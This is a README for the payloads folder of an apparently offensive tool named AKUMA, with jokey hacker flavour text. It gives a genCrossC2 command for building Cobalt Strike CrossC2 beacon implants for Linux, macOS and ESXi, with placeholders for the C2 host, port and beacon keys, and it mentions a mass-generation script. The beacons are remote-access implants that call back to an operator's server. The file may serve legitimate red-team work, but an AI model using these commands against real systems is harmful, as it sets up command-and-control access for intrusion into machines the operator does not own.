# 💣 AKUMA Payloads Directory

This directory will contain your generated CrossC2 beacon payloads.

## ⚠️ Security Notice
**Generated beacon files are NOT included in the repository for security reasons!**

## 🚀 Generate Your Payloads

### Quick Generation:
```bash
# From project root directory
./tools/genCrossC2.Linux \
  YOUR_C2_HOST \
  YOUR_C2_PORT \
  /path/to/.cobaltstrike.beacon_keys \
  null \
  Linux \
  x64 \
  ./payloads/my_beacon \
  raw
```

### Mass Generation:
```bash
# Use the mass generator script
./examples/mass_beacon_generator.sh
```

## 🎯 Supported Platforms
- **Linux** (x86/x64)
- **macOS** (x86/x64/M1)
- **ESXi** (x64)
- **Linux-bind** (x64)
- **macOS-bind** (x64)

## 💀 Remember
All generated beacons will appear here after generation. Keep them secure!

*"A payload without encryption is like a hacker without a hoodie - technically works, but no style!"* - AKUMA
